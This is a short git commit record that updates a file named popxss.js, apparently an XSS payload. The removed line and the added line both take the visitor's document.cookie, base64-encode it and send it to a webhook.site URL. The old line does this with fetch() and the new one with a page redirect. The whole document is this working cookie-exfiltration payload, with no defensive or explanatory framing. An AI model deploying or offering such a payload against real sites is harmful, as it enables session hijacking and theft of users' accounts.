651d228560cfb765e44ad46e88b77893a90b057b
Dibyendu Sikdar <dibyendu.coder@gmail.com>
2023-07-03 22:53:33 +0200

    Update popxss.js

--- popxss.js
+++ popxss.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/bebcf65a-9993-4c66-8bb9-31ca0f43115f/?'+btoa(document.cookie));
+document.location = 'https://webhook.site/bebcf65a-9993-4c66-8bb9-31ca0f43115f/?'+btoa(document.cookie);
